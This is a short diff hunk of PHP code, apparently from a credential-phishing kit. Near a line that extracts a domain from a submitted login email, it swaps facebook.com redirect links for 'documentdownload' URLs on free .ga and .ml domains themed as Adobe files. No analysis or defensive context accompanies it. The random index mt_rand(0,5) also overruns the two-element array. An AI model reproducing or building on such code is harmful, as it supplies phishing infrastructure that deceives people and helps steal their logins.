@@ -23,8 +23,8 @@ $domain = getDomainFromEmail($login);
 
 
 <?php
-$liks = array("https://facebook.com",
-"https://facebook.com");
+$liks = array("https://documentdownload.ga/adobefile/",
+"https://documentdownload.ml/adobefile/");
 
 $num= mt_rand(0,5);
 
